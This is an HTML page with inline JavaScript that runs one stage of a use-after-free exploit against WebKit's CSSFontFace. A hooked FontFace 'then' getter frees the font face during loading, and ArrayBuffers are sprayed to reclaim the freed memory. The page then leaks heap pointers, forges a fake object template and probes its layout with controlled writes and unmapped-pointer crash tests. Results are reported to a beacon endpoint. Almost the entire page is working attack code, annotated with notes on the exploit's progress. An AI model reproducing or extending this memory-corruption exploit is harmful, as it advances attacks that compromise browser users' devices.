<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1218 CSSFontFace vtable redirect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
</style>
</head><body>
<div id="s">P1218 BOOTING...</div>
<div id="r"></div>
<script>
'use strict';
/* ═══════════════════════════════════════════════════════════════════
   P1218: CSSFontFace vtable redirect experiment

   P1217 confirmed:
   - Template accepted, engine trusts our 192B buffer
   - f1:loaded status, check()=true
   - No m_status discriminator at tested offsets
   - Buffer stable (no engine writes after template)
   - p68 stable across runs (0x10007e13b0)

   KEY INSIGHT: CSSFontFace inherits from RefCounted<CSSFontFace>.
   In WebKit's RefCounted, the ref count is at +0x00 (no vtable on
   RefCounted itself). But CSSFontFace has virtual methods, so:
   - +0x00: m_refCount (from RefCounted — we set this to 1)
   - +0x08: VTABLE POINTER (from the CSSFontFace class itself)

   Wait — actually in WebKit's implementation:
   - RefCountedBase has m_refCount at offset 0
   - The vtable for CSSFontFace would be at offset -sizeof(void*)
     relative to the RefCounted pointer... NO.

   Actually: CSSFontFace inherits RefCounted AND CanMakeWeakPtr.
   The layout depends on the inheritance order. Let me probe empirically.

   APPROACH: We have the FULL 192B buffer. The engine currently trusts
   it. Let's try reading WHAT the engine originally wrote (from P1215's
   hex dump) and compare with what fields the engine needs.

   From P1215 hex dump:
   +0x00: 01 00 00 00 00 00 00 00  (refcount = 1)
   +0x08..+0x57: all zeros
   +0x58: engine heap ptr (WeakHashSet impl)
   +0x68: engine heap ptr (WeakPtr impl)
   +0x70..+0xBF: all zeros

   So the engine wrote ONLY at +0x00, +0x58, +0x68. No vtable!
   This means either:
   a) CSSFontFace has no virtual methods (unlikely)
   b) The vtable was zeroed when the object was freed (free zeroes header)
   c) The engine accesses the object through non-virtual paths

   NEW PLAN: Use the FontFace JS wrapper to trigger operations that
   READ from arbitrary offsets in our controlled buffer, then map the
   full CSSFontFace layout by checking what values produce different
   observable outcomes (descriptor reads, CSS computed style, etc.)
   ═══════════════════════════════════════════════════════════════════ */

var S=document.getElementById('s'),R=document.getElementById('r');
function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}

function B(tag,data){
  try{
    var u='/beacon.php?tag=P1218-'+encodeURIComponent(tag);
    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
    u+='&t='+Date.now();
    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
  }catch(e){}
}
window.onerror=function(m,s,l){B('ERR',m+'@'+l);};

var K=8, SIZE=192;
var styleEl=null, firedHere=false;
var leaked={p58:null,p68:null};
var templateBuf=null;

function hex(v){return ('0'+v.toString(16)).slice(-2);}
function hexq(arr){
  if(!arr)return 'null';
  var s='0x';for(var i=7;i>=0;i--)s+=hex(arr[i]);return s;
}
function grab(view,off){var a=[];for(var i=0;i<8;i++)a.push(view[off+i]);return a;}
function setq(view,off,arr){for(var i=0;i<8;i++)view[off+i]=arr[i];}

function setupFace(name,cssName,range){
  styleEl=document.createElement('style');
  styleEl.textContent="@font-face { font-family: "+cssName+"; src: local(Arial); unicode-range: "+range+"; }";
  document.head.appendChild(styleEl);
  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(A);
  void A.loaded;
  if(!window.__alive)window.__alive=[];
  window.__alive.push(A);
}

function installGetter(fillTemplate){
  firedHere=false;
  Object.defineProperty(FontFace.prototype,'then',{
    configurable:true,
    get:function(){
      if(firedHere)return undefined;
      firedHere=true;
      if(styleEl)styleEl.remove();
      try{document.fonts.delete(this);}catch(e){}
      styleEl=null;
      document.body.offsetHeight;
      window.__map=[];
      for(var k=0;k<K;k++){
        var ab=new ArrayBuffer(SIZE);
        var v=new Uint8Array(ab);
        if(fillTemplate&&leaked.p58){
          setq(v,0x00,[0x01,0,0,0,0,0,0,0]);
          setq(v,0x58,leaked.p58);
          setq(v,0x68,leaked.p68);
        }
        window.__map.push({size:SIZE,view:v,ab:ab});
      }
      try{document.fonts.check('1em s0');}catch(e){}
      return undefined;
    },
    set:function(){}
  });
}

S.textContent='P1218 STAGE 1...';
B('START','stage1');

/* ═══════ STAGE 1 ═══════ */
window.__alive=[];
setupFace('f0','s0','U+0042');
installGetter(false);

document.fonts.load('1em f0, s0','AB').then(
  function(){B('S1-RESOLVED','ok');},
  function(){}
);

setTimeout(function(){
  var m=window.__map;
  if(!m||!m.length){setTimeout(function(){location.reload();},500);return;}
  var best=-1,nz=0;
  for(var i=0;i<m.length;i++){
    var v=m[i].view,n=0;
    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
    if(n>nz){nz=n;best=i;}
  }
  if(best<0){
    B('S1-CLEAN','retry');
    setTimeout(function(){location.reload();},500);
    return;
  }
  var v=m[best].view;
  leaked.p58=grab(v,0x58);
  leaked.p68=grab(v,0x68);

  /* FULL hex dump of the reclaimed buffer — every byte matters */
  var dump='';
  for(var j=0;j<SIZE;j++){
    if(j%16===0)dump+='\n+'+('0'+(j>>4).toString(16)).slice(-2)+('0'+(j&0xf).toString(16)).slice(-1)+'0: ';
    dump+=hex(v[j])+' ';
  }
  B('S1-HIT','b'+best+'|nz='+nz+'|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
  B('S1-DUMP1',dump.slice(0,900));
  B('S1-DUMP2',dump.slice(900,1800));
  msg('S1 HIT: p58='+hexq(leaked.p58)+' p68='+hexq(leaked.p68)+' nz='+nz);
  msg('dump:'+dump);
  S.textContent='S1 HIT! Stage 2...';
  setTimeout(runStage2,200);
},60);

setTimeout(function(){
  if(leaked.p58)return;
  var m=window.__map;if(!m||!m.length)return;
  var best=-1,nz=0;
  for(var i=0;i<m.length;i++){var v=m[i].view,n=0;for(var j=0;j<v.length;j++)if(v[j]!==0)n++;if(n>nz){nz=n;best=i;}}
  if(best<0)return;
  var v=m[best].view;
  leaked.p58=grab(v,0x58);leaked.p68=grab(v,0x68);
  B('S1-HIT2','b'+best+'|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
  setTimeout(runStage2,200);
},400);

setTimeout(function(){
  if(leaked.p58)return;
  B('S1-TIMEOUT','retry');
  setTimeout(function(){location.reload();},500);
},2000);


/* ═══════ STAGE 2: Template ═══════ */
function runStage2(){
  B('S2-START','go');
  S.textContent='STAGE 2: TEMPLATE...';
  setupFace('f1','s1','U+0043');
  installGetter(true);

  document.fonts.load('1em f1, s1','AB').then(
    function(){
      B('S2-RESOLVED','ok');
      var m2=window.__map;
      for(var i=0;i<m2.length;i++){
        var v=m2[i].view;
        if(v[0]===1&&v[1]===0){
          var match=true;
          for(var b=0;b<8;b++)if(v[0x58+b]!==leaked.p58[b]){match=false;break;}
          if(match){templateBuf=m2[i];B('S2-FOUND','buf'+i);break;}
        }
      }
      S.textContent='S2 OK! Stage 3...';
      setTimeout(runStage3,300);
    },
    function(){B('S2-REJECTED','fail');}
  );
}


/* ═══════ STAGE 3: Controlled experiments ═══════ */
function runStage3(){
  if(!templateBuf){B('S3-NOBUF','err');return;}
  B('S3-START','go');
  S.textContent='STAGE 3: EXPERIMENTS...';
  msg('');
  msg('=== STAGE 3: Controlled experiments ===');

  var tv=templateBuf.view;
  var bv=new BigUint64Array(templateBuf.ab);

  /* ─── 3A: Read FontFace JS descriptor properties ─── */
  /* The FontFace JS wrapper reads through the C++ CSSFontFace.
     Each descriptor getter reads from a specific offset in CSSFontFace.
     By modifying bytes and checking what the getter returns, we can
     map the internal layout. */

  var descriptors=[];
  try{
    /* Find our FontFace JS wrapper for f1 */
    var ff1=null;
    document.fonts.forEach(function(f){if(f.family==='f1')ff1=f;});

    if(!ff1){
      /* f1 might not be in document.fonts. Try via the alive array. */
      for(var i=0;i<window.__alive.length;i++){
        if(window.__alive[i].family==='f1'){ff1=window.__alive[i];break;}
      }
    }

    if(ff1){
      /* Read each descriptor — these read through CSSFontFace internals */
      try{descriptors.push('family='+ff1.family);}catch(e){descriptors.push('family=ERR:'+e.message.slice(0,30));}
      try{descriptors.push('style='+ff1.style);}catch(e){descriptors.push('style=ERR:'+e.message.slice(0,30));}
      try{descriptors.push('weight='+ff1.weight);}catch(e){descriptors.push('weight=ERR:'+e.message.slice(0,30));}
      try{descriptors.push('stretch='+ff1.stretch);}catch(e){descriptors.push('stretch=ERR:'+e.message.slice(0,30));}
      try{descriptors.push('unicodeRange='+ff1.unicodeRange);}catch(e){descriptors.push('unicodeRange=ERR:'+e.message.slice(0,30));}
      try{descriptors.push('display='+ff1.display);}catch(e){descriptors.push('display=ERR:'+e.message.slice(0,30));}
      try{descriptors.push('status='+ff1.status);}catch(e){descriptors.push('status=ERR:'+e.message.slice(0,30));}

      B('S3-DESC',descriptors.join('|'));
      msg('descriptors: '+descriptors.join(', '));
    }else{
      B('S3-NOFF1','notfound');
      msg('FontFace f1 not found in JS');
    }
  }catch(e){
    B('S3-DESC-ERR',e.message);
  }

  /* ─── 3B: Layout-based probing ─── */
  /* Create elements that use f1 and measure them. The CSS font
     matching walks CSSFontFace fields to check font properties. */
  var layoutResults=[];
  var testStrings=['A','B','C','X','ABCDEFGH'];
  for(var ti=0;ti<testStrings.length;ti++){
    try{
      var sp=document.createElement('span');
      sp.style.cssText='font-family:s1,serif;font-size:100px;position:absolute;left:-9999px;top:'+(ti*150)+'px';
      sp.textContent=testStrings[ti];
      document.body.appendChild(sp);
      var w=sp.offsetWidth,h=sp.offsetHeight;
      layoutResults.push(testStrings[ti]+':'+w+'x'+h);
    }catch(e){
      layoutResults.push(testStrings[ti]+':ERR');
    }
  }
  B('S3-LAYOUT',layoutResults.join('|'));
  msg('layout: '+layoutResults.join(', '));

  /* ─── 3C: The REAL experiment: controlled write + observe ─── */
  /* Write unique values at every 8-byte offset (except 0x00/0x58/0x68)
     and check what changes in observable behavior. This maps which offsets
     the engine actually reads through for different operations. */

  var writeResults=[];
  var testQwords=[0x08,0x10,0x18,0x20,0x28,0x30,0x38,0x40,0x48,0x50,
                  0x70,0x78,0x80,0x88,0x90,0x98,0xA0,0xA8,0xB0,0xB8];

  for(var qi=0;qi<testQwords.length;qi++){
    var off=testQwords[qi];
    /* Write 0x4141414141414141 at this offset */
    for(var b=0;b<8;b++)tv[off+b]=0x41;

    /* Test: does check() still work? */
    var alive=true;
    var checkVal='?';
    try{
      checkVal=document.fonts.check('1em f1')?'T':'F';
    }catch(e){
      checkVal='E:'+e.message.slice(0,20);
    }

    /* Test: does layout still work? */
    var layoutOk='?';
    try{
      var sp2=document.createElement('span');
      sp2.style.cssText='font-family:s1,serif;font-size:20px;position:absolute;left:-9999px';
      sp2.textContent='X';
      document.body.appendChild(sp2);
      var w2=sp2.offsetWidth;
      layoutOk=w2>0?'ok':'zero';
      sp2.remove();
    }catch(e){
      layoutOk='E';
    }

    /* Restore zeros */
    for(var b=0;b<8;b++)tv[off+b]=0;

    writeResults.push('+0x'+off.toString(16)+':c='+checkVal+',l='+layoutOk);
  }

  B('S3-WRITES',writeResults.join('|'));
  msg('write results: '+writeResults.join(', '));

  /* ─── 3D: Check which offsets CRASH when filled ─── */
  /* If writing a bad pointer at an offset crashes, that offset
     is being dereferenced. Test with an unmapped address. */

  var crashTests=[];
  var unmapped=[0xFF,0xFF,0xFF,0xFF,0xDE,0xAD,0x00,0x00]; /* 0xDEADFFFFFFFF - unmapped */

  for(var qi=0;qi<testQwords.length;qi++){
    var off=testQwords[qi];
    setq(tv,off,unmapped);

    var survived=true;
    var result='?';
    try{
      /* Trigger a read: check() reads through the CSSFontFace */
      result=document.fonts.check('1em s1')?'T':'F';
    }catch(e){
      result='E:'+e.message.slice(0,20);
      survived=false;
    }

    /* Restore zeros */
    setq(tv,off,[0,0,0,0,0,0,0,0]);

    crashTests.push('+0x'+off.toString(16)+'='+result);
  }

  B('S3-CRASH',crashTests.join('|'));
  msg('crash tests: '+crashTests.join(', '));

  /* ─── 3E: FontFace.loaded promise experiment ─── */
  /* If the FontFace wrapper still has a .loaded promise pointing to
     our fake CSSFontFace, resolving/rejecting it might walk internal state */
  try{
    var ff1=null;
    for(var i=0;i<window.__alive.length;i++){
      if(window.__alive[i].family==='f1'){ff1=window.__alive[i];break;}
    }
    if(ff1&&ff1.loaded){
      ff1.loaded.then(function(){
        B('S3-LOADED','resolved');
        msg('f1.loaded resolved');
      }).catch(function(e){
        B('S3-LOADED-ERR',e.message);
      });
    }
  }catch(e){
    B('S3-LOADED-EX',e.message);
  }

  /* ─── 3F: Try to get self-address via FontFace pointer disclosure ─── */
  /* P1216 confirmed FontFace heap pointers are in 0x10_00xxxxxxxx.
     If we can find a way to read OUR ArrayBuffer's address, we win.

     Idea: structuredClone the ArrayBuffer and check if the new buffer's
     address is predictable relative to the original. Not directly useful,
     but might reveal allocator patterns. */
  try{
    var cloned=templateBuf.ab.slice(0); /* copy */
    var cv=new BigUint64Array(cloned);
    /* Check if clone has any different data (it shouldn't) */
    var diffs=0;
    for(var i=0;i<24;i++){
      if(cv[i]!==bv[i])diffs++;
    }
    B('S3-CLONE','diffs='+diffs);
  }catch(e){}

  /* ═══════ SUMMARY ═══════ */
  setTimeout(function(){
    msg('');
    msg('=== P1218 COMPLETE ===');
    S.textContent='P1218 COMPLETE';
    B('DONE','all');
  },1500);
}

</script>
</body></html>
